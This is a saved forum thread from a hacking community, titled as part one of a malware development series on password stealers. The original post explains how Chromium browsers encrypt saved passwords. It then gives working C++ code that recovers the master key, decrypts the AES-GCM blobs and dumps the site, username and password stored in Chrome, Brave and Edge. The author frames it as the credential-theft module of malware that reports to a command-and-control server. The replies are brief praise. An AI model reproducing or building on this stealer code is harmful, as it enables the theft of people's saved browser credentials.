<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Malware Development 1 : Password Stealers (chrome) - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Introduction

In this article, I will discuss the encryption and decryption process of Chromium, and then I will provide some C++ code to retrieve encrypted passwords from a computer and decrypt them. First, I will give&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="33571.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Malware Development 1 : Password Stealers (chrome)&#39;" href="33571.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/3X/b/2/b21fa57f598a7329913e5f477506f1458864975a.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/3X/b/2/b21fa57f598a7329913e5f477506f1458864975a.png" />
<meta property="og:url" content="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571" />
<meta name="twitter:url" content="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571" />
<meta property="og:title" content="Malware Development 1 : Password Stealers (chrome)" />
<meta name="twitter:title" content="Malware Development 1 : Password Stealers (chrome)" />
<meta property="og:description" content="Introduction  In this article, I will discuss the encryption and decryption process of Chromium, and then I will provide some C++ code to retrieve encrypted passwords from a computer and decrypt them. First, I will give a brief overview of how the process works before moving on to the code.  Many malware programs have a module or functionality specifically designed to steal passwords and cookies and send that data back to a CnC server. In this article, we will focus primarily on the password de..." />
<meta name="twitter:description" content="Introduction  In this article, I will discuss the encryption and decryption process of Chromium, and then I will provide some C++ code to retrieve encrypted passwords from a computer and decrypt them. First, I will give a brief overview of how the process works before moving on to the code.  Many malware programs have a module or functionality specifically designed to steal passwords and cookies and send that data back to a CnC server. In this article, we will focus primarily on the password de..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="programming" />
<meta property="og:article:tag" content="malware" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="5 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="38 ❤" />
<meta property="article:published_time" content="2023-02-22T03:42:22+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="33571.html">Malware Development 1 : Password Stealers (chrome)</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/programming.html" class="discourse-tag" rel="tag">programming</a>,
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Malware Development 1 : Password Stealers (chrome)">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="programming, malware">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/EVIL-ACID"><span itemprop="name">EVIL-ACID</span></a>
(Evil Acid)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/3X/b/2/b21fa57f598a7329913e5f477506f1458864975a.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-02-22T03:42:22Z" class="post-time">
February 22, 2023, 3:42am
</time>
<meta itemprop="dateModified" content="2023-02-22T03:42:22Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<h1>
<a name="introduction-1" class="anchor" href="33571.html#introduction-1"></a>Introduction</h1>
<hr>
<p>In this article, I will discuss the encryption and decryption process of Chromium, and then I will provide some C++ code to retrieve encrypted passwords from a computer and decrypt them. First, I will give a brief overview of how the process works before moving on to the code.</p>
<p>Many malware programs have a module or functionality specifically designed to steal passwords and cookies and send that data back to a CnC server. In this article, we will focus primarily on the password decryption process used by these malwares. However, it’s important to note that this process is essentially the same across all Chromium browsers version 80 or higher, and any encrypted data in Chrome can be decrypted using the same method.</p>
<h1>
<a name="overview-2" class="anchor" href="33571.html#overview-2"></a>Overview</h1>
<hr>
<p>Previously, the Chrome process used the Windows Data Protection API (DPAPI) to encrypt all locally stored data on a Windows system. However, in newer versions of Chrome (version 80 or higher), the AES-GCM algorithm is now used to store sensitive data locally. The Windows Data Protection API is only used to encrypt the and derive symmetric key used by AES. Here’s a brief overview of the entire process for Chrome:</p>
<ul>
<li>
<p>When a user chooses to save their password, Chrome generates a unique key for that password, which is then encrypted using the <code>CryptProtectData</code> function from DPAPI.</p>
</li>
<li>
<p>Before the key is saved in the <strong>Local State</strong> file, the prefix “DPAPI” is inserted at the beginning of the key.</p>
</li>
</ul>
<pre><code class="lang-auto">"encrypted_key":"RFBBUEk.........Od5n"
</code></pre>
<p>“RFBBUEk” is base64 decoded to DPAPI</p>
<ul>
<li>
<p>The master key is then encoded in base64 and stored in the <strong>Local State</strong> file.</p>
</li>
<li>
<p>Sensitive data is encrypted using AES-GCM, which is authenticated encryption, meaning it provides both confidentiality and integrity of data.</p>
</li>
<li>
<p>After the encryption process of user data, the data is then stored in a <strong>Login Data</strong> SQLite file in the <strong>logins</strong> table. Here are some of the fields of interest:</p>
</li>
</ul>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/2/b21fa57f598a7329913e5f477506f1458864975a.png" alt="image" data-base62-sha1="ppKN6rtATF4yVrBKxnYaF84ybrQ" width="631" height="146"></p>
<h1>
<a name="decryption-3" class="anchor" href="33571.html#decryption-3"></a>Decryption</h1>
<hr>
<p>With the encryption process out of the way, here are some things we need to do to decrypt data/passwords:</p>
<ol>
<li>
<p>Retrieve the master key from the <strong>Local State</strong> file.</p>
</li>
<li>
<p>Unprotect the master key. Remember, the initial process used <code>CryptProtectData</code>, so we will use <code>CryptUnprotectData</code>.</p>
</li>
<li>
<p>Implement a function for the AES-GCM decryption process.</p>
</li>
<li>
<p>Open an SQL connection to the <strong>Login Data</strong> file and retrieve the fields we want. In this case, the only encrypted field in the image above is the <code>password_value</code> field.</p>
</li>
</ol>
<h1>
<a name="implementation-4" class="anchor" href="33571.html#implementation-4"></a>Implementation</h1>
<hr>
<h3>
<a name="h-1-retrieve-the-master-key-5" class="anchor" href="33571.html#h-1-retrieve-the-master-key-5"></a>1. Retrieve the master key</h3>
<pre><code class="lang-cpp">
DATA_BLOB* GetMasterKey(BROWSER browser)
{

	// Retrieveing the master key from the Local State File
	std::string localState = FileIO::GetLocalState(browser);
	std::string localStateData = FileIO::ReadFileToString(localState);
	std::string MasterString = ParseMasterString(localStateData);
	
	// Unprotect the master key.
	return UnportectMasterKey(MasterString);
}

</code></pre>
<p>I have a few pointers here regarding the FileIO namespace. It contains only a few functions, such as reading a file to a string, getting app data, and getting a database file. To keep things short, I won’t include the code snippets here, but you can find everything in the GitHub link.</p>
<p>Also, I have a <code>ReadFileToString</code> function that reads the entire local state file and manually searches for the key with <code>PraseMasterString</code>. This is definitely not the best way to solve the problem, but it’s simple enough to keep this example short. Realistically, we would want to use a small JSON library to parse the necessary data since it is more robust and reliable to do it that way.</p>
<h3>
<a name="h-2-unprotect-master-key-function-6" class="anchor" href="33571.html#h-2-unprotect-master-key-function-6"></a>2. Unprotect Master Key Function</h3>
<pre><code class="lang-cpp">
DATA_BLOB* UnportectMasterKey(std::string MasterString)
{
	std::vector&lt;unsigned char&gt; binaryKey;
	DWORD binaryKeySize = 0;


	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &amp;binaryKeySize, NULL, NULL))
	{
		std::cout&lt;&lt; "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &amp;binaryKeySize, NULL, NULL))
	{
		std::cout&lt;&lt; "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	// Calling CryptUnprotectData to unprotect the master key.
	// Out DATA_BLOB will hold the key we need with its length.
	DATA_BLOB in;
	DATA_BLOB *out = new DATA_BLOB;
	in.pbData = binaryKey.data() + 5; // Remove DPAPI
	in.cbData = binaryKeySize - 5;

	if (!CryptUnprotectData(&amp;in, NULL, NULL, NULL, NULL, 0, out))
	{
		std::cout&lt;&lt; "CryptUnprotectData [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}
	return out;
}

</code></pre>
<p>As we know, the key was encoded with base64 and prepended with “DPAPI” during the initial encryption process. Therefore, a few things that we need to do in this function are to call the Windows function <code>CryptStringToBinaryA</code> with the <code>CRYPT_STRING_BASE64</code> to decode our string.</p>
<p>After that, we used <code>in.pbData = binaryKey.data() + 5</code>. The “+5” is used so that we can obtain only the data after the prepended “DPAPI” string.</p>
<h3>
<a name="h-3-aes-gcm-decryption-7" class="anchor" href="33571.html#h-3-aes-gcm-decryption-7"></a>3. AES-GCM Decryption</h3>
<pre><code class="lang-cpp">std::string AESDecrypter(std::string EncryptedBlob, DATA_BLOB MasterKey)
{
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey = 0;
	NTSTATUS status = 0;
	SIZE_T EncryptedBlobSize = EncryptedBlob.length();
	SIZE_T TagOffset = EncryptedBlobSize - 15;
	ULONG PlainTextSize = 0;

	std::vector&lt;BYTE&gt; CipherPass(EncryptedBlobSize); // hold the passwords ciphertext.
	std::vector&lt;BYTE&gt; PlainText;
	std::vector&lt;BYTE&gt; IV(IV_SIZE); // Will hold initial vector data.

	// Parse iv and password from the buffer using std::copy
	std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
	std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

	// Open algorithm provider for decryption
	status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCryptOpenAlgorithmProvider failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		return "";
	}

	// Set chaining mode for decryption
	status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCryptSetProperty failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Generate symmetric key
	status = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BcryptGenertaeSymmetricKey failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Auth cipher mode info
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
	TagOffset = TagOffset - 16;
	AuthInfo.pbNonce = IV.data();
	AuthInfo.cbNonce = IV_SIZE;
	AuthInfo.pbTag = CipherPass.data() + TagOffset;
	AuthInfo.cbTag = TAG_SIZE;

	// Get size of plaintext buffer
	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &amp;AuthInfo, NULL, 0, NULL, NULL, &amp;PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCryptDecrypt (1) failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		return "";
	}

	// Allocate memory for the plaintext
	PlainText.resize(PlainTextSize);

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &amp;AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &amp;PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCrypt Decrypt (2) failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		return "";
	}

	// Close the algorithm handle
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return std::string(PlainText.begin(), PlainText.end());
}


</code></pre>
<p>This was a pretty complicated function to work on, mainly because Windows’ BCrypt documentation was all over the place, especially once you get into authenticated encryption.</p>
<p>Before you try to understand any of it, go ahead and do a quick read on AES encryption with the GCM mode. Here’s a pretty nice <a href="https://crypto.stackexchange.com/a/18092" rel="noopener nofollow ugc">comment</a> that sums it up.</p>
<p>A quick overview of what we’re doing here:</p>
<ul>
<li>
<p>The encrypted password field contains important data we need for decryption.</p>
</li>
<li>
<p>The first is a prepended “v10” string. I’m not really sure what it is, but it’s not important in our case, so I’m assuming it’s something that they can use as an identifier for older versions if they ever move to something different in the future.</p>
</li>
<li>
<p>The third important piece is the IV. This is a random and unique 12-byte initial vector (IV), also called a nonce.</p>
</li>
<li>
<p>Lastly, we have the authentication tag. The tag is an output of the encryption function and an input for the decryption function. It’s used to make sure the data was not tampered with.</p>
</li>
</ul>
<p>We extract the first IV with the first call to <code>copy</code>. We start added 3 because we want to skip the “v10” prefix and copy up to IV_SIZE + 3.</p>
<p>Similarly, with the second call to <code>copy</code>, we extract ciphertext starting from 15 to the end of the string. Why 15? Because the first “v10” string is 3 bytes plus the first IV 12 bytes equals 15.</p>
<p>After that, we make several calls to some BCrypt functions:</p>
<ul>
<li>
<p><code>BCryptOpenAlgorithmProvider</code> initializes a handle to the Windows algorithm provider.</p>
</li>
<li>
<p><code>BCryptSetProperty</code> sets the properties of the algorithm we are using, so in this case, AES with GCM mode.</p>
</li>
<li>
<p><code>BCryptGenerateSymmetricKey</code> The most important step is generating/deriving the key from the master key.</p>
</li>
<li>
<p>Initializing the AuthInfo struct with authentication data we need like IV (nonce), IV size, tag for authentication.</p>
</li>
<li>
<p>Finally, with all that, we make two <code>BCryptDecrypt</code> calls. The first is to retrieve the size, and the second is to decrypt the data and store it in our vector.</p>
</li>
</ul>
<h3>
<a name="h-4-parsing-the-database-8" class="anchor" href="33571.html#h-4-parsing-the-database-8"></a>4. Parsing the Database</h3>
<hr>
<p>All we have to do now is retrieve the data from the SQLite database <strong>Login Data</strong> and pass in the password to the AESdecrypterFunction.</p>
<pre><code class="lang-cpp">void DecryptPasswordFor(BROWSER browser)
{
	std::string DbPath = FileIO::GetDbPath(browser);
	DATA_BLOB* MasterKey = GetMasterKey(browser);

	sqlite3* db = nullptr;
	std::string selectQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins";
	sqlite3_stmt* selectStmt = nullptr;


	// Open the database file
	if (sqlite3_open(DbPath.c_str(), &amp;db) != SQLITE_OK) {
		std::cerr &lt;&lt; "Failed to open database file: " &lt;&lt; sqlite3_errmsg(db) &lt;&lt; std::endl;
		return;
	}

	// Prepare the SELECT statement
	if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &amp;selectStmt, 0) != SQLITE_OK) {
		std::cerr &lt;&lt; "Failed to prepare SELECT statement: " &lt;&lt; sqlite3_errmsg(db) &lt;&lt; std::endl;
		return;
	}
	// Iterate over the rows of the logins table
	while (sqlite3_step(selectStmt) == SQLITE_ROW) {
		// Extract the values of the columns
		const char* website = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 0));
		const char* loginUrl = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 1));
		const char* userName = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 2));
		const char* passwordBlob = reinterpret_cast&lt;const char*&gt;(sqlite3_column_blob(selectStmt, 3));
		int passwordBlobSize = sqlite3_column_bytes(selectStmt, 3);

		if (passwordBlobSize &gt; 0) {
			// Decrypt the password
			std::string pass = AESDecrypter(passwordBlob, *MasterKey);
			// Print the login information
			std::cout &lt;&lt; "Website: " &lt;&lt; website &lt;&lt; std::endl;
			std::cout &lt;&lt; "Login URL: " &lt;&lt; loginUrl &lt;&lt; std::endl;
			std::cout &lt;&lt; "User name: " &lt;&lt; userName &lt;&lt; std::endl;
			std::cout &lt;&lt; "Password: " &lt;&lt; pass &lt;&lt; std::endl;
		}
		else {
			// Print a message if the password is empty
			std::cout &lt;&lt; "No password found " &lt;&lt; std::endl;
		}
	}

	delete MasterKey;
}

</code></pre>
<h2>
<a name="conclusion-9" class="anchor" href="33571.html#conclusion-9"></a>Conclusion</h2>
<p>In this post we went quickly went over the encryption and decryption process used by Chrome to store and protect sensitive user data such as passwords. The process involves generating a unique master key, which is then encrypted using the Windows Data Protection API (DPAPI) and stored in the Local State file. Sensitive data is then encrypted using the AES-GCM algorithm and stored in the Login Data SQLite file. To retrieve and decrypt the data, the master key must be retrieved and decrypted using CryptUnprotectData, and the password value must be decrypted using an AES-GCM decryption process. This process the decryption process is common amongst chromium browsers.</p>
<p>But I wouldn’t say the same for my other functions in FileIO.h lol, I did try it on 3 different browsers and it works but I believe other chromium browsers store database and local state files in different locations, so that’s something to double check on.</p>
<p>I did experiment with on 3 different browsers and it works for those.</p>
<pre><code class="lang-cpp">int main() {


	std::cout &lt;&lt; "CHROME\n\n";	
	DecryptPasswordFor(CHROME);
	std::cout &lt;&lt; "\n\nBRAVE\n\n";
	DecryptPasswordFor(BRAVE);
	std::cout &lt;&lt; "\n\nEDGE\n\n";
	DecryptPasswordFor(EDGE);
}
</code></pre>
<p>Here’s the full output</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/0/e0faf5f75cf959fcaec27a8fbfa4dcf67c4c0df2.png" data-download-href="/uploads/short-url/w6gDkJJx7zjNiaeSqaUYDtWV83w.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/0/e0faf5f75cf959fcaec27a8fbfa4dcf67c4c0df2.png" alt="image" data-base62-sha1="w6gDkJJx7zjNiaeSqaUYDtWV83w" width="539" height="500" data-dominant-color="161616"><div class="meta">
<svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">image</span><span class="informations">908×842 20.4 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg>
</div></a></div></p>
<p>That’s all for this post, if you have any questions, clarification, or improvements please let me know below. I’m still in the learning process and would greatly appreciate the feedback.</p>
<p>Thx for reading <img src="../../images/emoji/twitter/slight_smile.png%3Fv=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<h3>
<a name="source-code-linkhttpsgithubcomevil-acidmalware-developmenttreemainmalware101infostealers-10" class="anchor" href="33571.html#source-code-linkhttpsgithubcomevil-acidmalware-developmenttreemainmalware101infostealers-10"></a><a href="https://github.com/EVIL-ACID/Malware-Development/tree/main/Malware101:Infostealers" rel="noopener nofollow ugc">Source code link</a>
</h3>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="26" />
<span class="post-likes">26 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/theslycat"><span itemprop="name">theslycat</span></a>
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-02-25T04:30:06Z" class="post-time">
February 25, 2023, 4:30am
</time>
<meta itemprop="dateModified" content="2023-02-25T04:30:06Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you for this. U kept it staright forward and sweat. Looking forward to seeing the next one.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/c0z"><span itemprop="name">c0z</span></a>
(Impetus Omnia Omnem Impetum)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-02-26T00:13:08Z" class="post-time">
February 26, 2023, 12:13am
</time>
<meta itemprop="dateModified" content="2023-02-26T00:13:08Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I’m slowly making a project for something else that’s Firefox / Chrome / Edge specific, this reminds me that I need to work on that lol.</p>
<p>Great job with this post! Didn’t even know that Chrome moved away from DPAPI keys.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/EVIL-ACID"><span itemprop="name">EVIL-ACID</span></a>
(Evil Acid)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-02-27T00:17:51Z" class="post-time">
February 27, 2023, 12:17am
</time>
<meta itemprop="dateModified" content="2023-02-27T00:17:51Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks,</p>
<p>Looking forward to reading about ur project here. Hopefully u post something about it here tho <img src="../../images/emoji/twitter/slight_smile.png%3Fv=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/m0perandi"><span itemprop="name">m0perandi</span></a>
(m0dus 0perandi)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-03-21T11:24:58Z" class="post-time">
March 21, 2023, 11:24am
</time>
<meta itemprop="dateModified" content="2023-03-21T11:24:58Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This is awesome information! Thank you for the wonderful content! &lt;3</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/n33ds0n"><span itemprop="name">n33ds0n</span></a>
(Popular Loner)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
